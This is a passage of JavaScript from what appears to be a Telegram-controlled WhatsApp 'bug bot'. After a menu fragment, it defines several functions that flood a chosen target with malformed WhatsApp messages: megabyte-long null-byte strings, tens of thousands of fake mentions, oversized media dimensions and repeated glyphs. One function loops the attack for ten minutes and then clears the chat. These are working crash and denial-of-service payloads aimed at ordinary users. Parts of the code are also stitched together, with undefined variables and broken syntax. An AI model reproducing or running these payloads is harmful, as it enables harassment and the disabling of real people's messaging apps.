<b>ᴜsᴇʀ ɪᴅ : ${senderId}</b>
<b>sᴛᴀᴛᴜs ᴘʀᴇᴍ : ${premiumStatus}</b>
<b>ʙᴏᴛ ʀᴜɴᴛɪᴍᴇ : ${runtime}</b>
<blockquote>⬡═—⊱SECURITY⊰—═⬡</blockquote>
<b>ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ</b>
<b>ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇ</b>
<blockquote>⧫━⟢『 THANKS 』⟣━⧫</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
        [
         { text: "xʙᴜɢ ᴍᴇɴᴜ", callback_data: "tmptt" },
         { text: "ᴄᴏɴᴛʀᴏʟ ᴀᴄᴄᴇss", callback_data: "akses" }
         ],
         [
          { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "tqto" },
          { text: "ᴄʜᴀɴᴇʟ ʀᴇsᴍɪ", url: "https://t.me/kalszxtesti" }
         ]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
///funct lu taroh sini
async function vXdelay(sock, target){
const startTimestamp = Date.now();
const attackDuration = 10 * 60 * 1000;
while (Date.now() - startTimestamp < attackDuration) {
for (let cycle = 0; cycle < 100; cycle++) {
const fakeMentions = Array.from({ length: 2000 }, (_, idx) => `628${idx + 1}9${idx + 1}@s.whatsapp.net`);
  const stickerPayload = {
    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
    "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
    "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
    "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
    "mimetype": "image/webp",
    "height": 512,
    "width": 512,
    "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
    "fileLength": "37824",
    "mediaKeyTimestamp": "1771680407",
    "isAnimated": false,
    "stickerSentTs": "1771694793768",
    "isAvatar": true,
    "isAiSticker": true,
    "isLottie": false,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAgBAhAAAAC1AEhSI2v/xAAZEQEAAgMAAAAAAAAAAAAAAAABABECAxL/2gAIAQMRAT8AOhiP/9oADAMBAAIAAwAAABDzzzzygA88888s888888s88s88s88s888s8/8QAHREAAgICAwEAAAAAAAAAAAAAAAERITEgQTBRUf/aAAgBAgEBPwDZII4FfC9WNLh//8QAGxEBAQACAwEAAAAAAAAAAAAAAAERIQASMUH/2gAIAQMBAT8A5hBRwg0TbV4y7KPbH//Z",
    contextInfo: {
      mentionedJid: fakeMentions,
      pairedMediaType: "HD_IMAGE_CHILD",
      statusSourceType: "MUSIC_STANDALONE",
      statusAttributions: [
        {
          type: "STATUS_MENTION",
          music: {
            authorName: "X",
            songId: "1137812656623908",
            title: "\u0000".repeat(1500),
            author: "\u0000".repeat(1500),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artworkMediaKey: "1771689153",
            artistAttribution: " x ",
            isExplicit: true
          }
        }
      ]
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMusic: {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            title: "\u0003".repeat(1500),
            author: "\u0003".repeat(1500),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artistAttribution: "https://t.me/null",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "1771689153"
          }
        },
        embeddedAction: true
      }
    ]
  };

  await sock.relayMessage("status@broadcast", {
    stickerMessage: stickerPayload
  },
  {
    statusJidList: [target]
  });

const audioPayload1 = {
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3,
        entryPointConversionSource: "StatusMessage",
      },
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: `#${Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "0")}`,

      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211,
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145,
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153,
        ]),
        directPath:
          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,

        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            () => `62${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
    };

    const firstAudioMsg = generateWAMessageFromContent(
      target,
      {
        ...audioPayload1,
        contextInfo: {
          ...audioPayload1.contextInfo,
          participant: "0@s.whatsapp.net",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", firstAudioMsg.message, {
      messageId: firstAudioMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });

sock.relayMessage("status@broadcast", 
{
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "K+ztV1kPJ/IPdUJnOKRSnd7ph77fEgy71KPmhcFUbpc=",
    "fileLength": "1332709",
    "seconds": 86400,
    "mediaKey": "MALF+tSSTMZufgmOofb86Z7LrumE0497jUjW82fhONI=",
    "caption": "꧁".repeat(50000),
    "height": 9999,
    "width": 99999,
    "fileEncSha256": "EiF137hLTwxdgGdtEJ8XqKmVatX8672vNrmI/vJyaXM=",
    "directPath": "/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1770563783",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAgBAhAAAAC1AEhSI2v/xAAZEQEAAgMAAAAAAAAAAAAAAAABABECAxL/2gAIAQMRAT8AOhiP/9oADAMBAAIAAwAAABDzzzzygA88888s888888s88s88s88s888s8/8QAHREAAgICAwEAAAAAAAAAAAAAAAERITEgQTBRUf/aAAgBAgEBPwDZII4FfC9WNLh//8QAGxEBAQACAwEAAAAAAAAAAAAAAAERIQASMUH/2gAIAQMBAT8A5hBRwg0TbV4y7KPbH//Z",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "VIDEO"
    },
    "streamingSidecar": "NcqOmk1FiSxZ1drVtpZhrx6JIcq6FkrdJZFyBrm3oDb2K4j6qsx16UlVSWSG/eaDEfMh4HcR7Yt99IprZfoOu/r/MvtPtopjpUyz/vjWIwsKhhH/yTo2+2NXxTY3NoWJLB46yQ8LXXGb6aM5D+IlwRZYF5Td2E9PxRHWsyjU580kSok5moVXt1fOCIArItLm3gqpowXyNllSXDc8xBNVkmjznPq23bAzfWsB4HlTxdLJxTr5W7wvNGv/urgz2LdXlyxbLjzGBE+HWVC+sLbIuo0s"
  }
},
{}
);

const audioPayload2 = {
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3,
        entryPointConversionSource: "galaxy_message",
      },
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: `#${Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "0")}`,

      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211,
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145,
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153,
        ]),
        directPath:
          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,

        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
    };

    const secondAudioMsg = generateWAMessageFromContent(
      target,
      {
        ...audioPayload2,
        contextInfo: {
          ...audioPayload2.contextInfo,
          participant: "0@s.whatsapp.net",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", secondAudioMsg.message, {
      messageId: secondAudioMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
 
 
const imageExploit = "https://files.catbox.moe/6nzx0v.jpg";

  const metaMentions = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const imageMessage = {
    image: { url: imageExploit },
    caption: "꧂".repeat(60000)
  };

  const albumContainer = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage("status@broadcast", albumContainer.message, { messageId: albumContainer.key.id });

    const craftedMsg = await generateWAMessage(target, imageMessage, {
      upload: sock.waUploadToServer
    });

    const msgType = Object.keys(craftedMsg.message).find(t => t.endsWith('Message'));

    craftedMsg.message[msgType].contextInfo = {
      mentionedJid: [
        ...metaMentions,
        ...Array.from({ length: 1900 }, () =>
          `62${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "6281212345678@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "꧁".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: albumContainer.key
      }
    };

    craftedMsg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "꧂".repeat(1000),
            phoneNumber: "+6281212345678"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "꧂".repeat(1000),
            url: "https://wa.me/+6281212345678?text=" + encodeURIComponent("꧁".repeat(1500))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "꧂".repeat(1000),
            payload: "\u0000".repeat(1000)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(1000) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+6281212345678" 
            }
        ]
      }
    };

    await sock.relayMessage("status@broadcast", craftedMsg.message, {
      messageId: craftedMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "xwar"
                    },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000),
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                        version: 3,
                        body: {
                            text: "Null"
                        },
                        contextInfo: {
                            remoteJid: "undefined@s.whatsapp.net",
                            mentionedJid: ["undefined@s.whatsapp.net"],
                            isForwarded: true,
                            forwardingScore: 9999,
                            parentGroupJid: "0@g.us"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100000 }, () => ({}))
                        }
                    }
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target }
                    }]
                }]
            }
        ]
    });
    
try {
      await sock.chatModify({ clear: true }, target);
            console.log("CONNECTED");
        } catch (error) {
            console.error("FAILED:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 500));
    }
  }
}

async function ExploitSender(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: "Z " + "ꦾ".repeat(1000), hasMediaAttachment: false },
          body: { text: "z҉⃝ Z CRASH".repeat(100) },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_url", buttonParamsJson: "{}" },
              { name: "quick_reply", buttonParamsJson: "{}" }
            ]
          }
        }
      }
    }
  };

  const msg2 = {
    buttonsMessage: {
      contentText: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(5000),
      quotedMessage: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
          fileLength: "999999999",
          height: 9999,
          width: 9999,
          mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
          fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, () => 1${Math.random() * 9e6}@s.whatsapp.net)
          }
        }
      },
      buttons: Array.from({ length: 50 }, (_, i) => ({
        buttonId: btn_${i},
        buttonText: { displayText: btn ${i} },
        type: 1
      }))
    }
  };

  await sock.relayMessage(target, msg, { participant: { jid: target } });
  await sock.relayMessage(target, msg2, { participant: { jid: target } });
}

async function LalahMaklu(sock, target) {
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: targetNumber,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(targetNumber, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetNumber],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetNumber },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

for (let dozer = 0; dozer < 1; dozer++) {
  await bulldozer2GB(sock, targetNumber);
}

async function xatabella(zauzet, target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝚍𝚞𝚊𝚛𝚛" + "ꦾ".repeat(Amount),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson:
                    venomModsData +
                    `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "𝚍𝚞𝚊𝚛𝚛",
                },
              ],
            },
          },
        },
      },
    },
    {
      userJid: target,
      quoted: KeyS,
    }
  );
  await zauzet.relayMessage(
    target,
    msg.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("𝚡𝚊𝚝𝚊𝚜𝚎𝚗𝚍𝚋𝚞𝚐"));
}

async function carousels2(zauzet, target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: imgCrL },
    { upload: client.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: "xata ✦ xataganteng",
    gifPlayback: false,
    subtitle: "xata ✦ ganteng",
    hasMediaAttachment: false,
  });

  for (let i = 0; i < 1000; i++) {
    cards.push({
      header,
      body: {
        text: "wkkw ✦ rorr",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com",
            }),
          },
        ],
      },
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Xata ✦ Ganteng",
            },
            footer: {
              text: "xata ✦ ganteng",
            },
            carouselMessage: {
              cards,
              messageVersion: 1,
            },
          },
        },
      },
    },
    {}
  );

  await zauzet.relayMessage(
    target,
    msg.message,
    fJids ? { participant: { jid: target, messageId: null } } : {}
  );
}

async function protocolbug3(target, mention) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption:
              "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath:
              "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
            },
            streamingSidecar:
              "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath:
              "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                    title: "Finix",
                    artworkDirectPath:
                      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256:
                      "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256:
                      "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution:
                      "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey:
                      "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                  },
                },
                embeddedAction: null,
              },
            ],
          },
        },
      },
    },
    {}
  );

  await zauzet.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
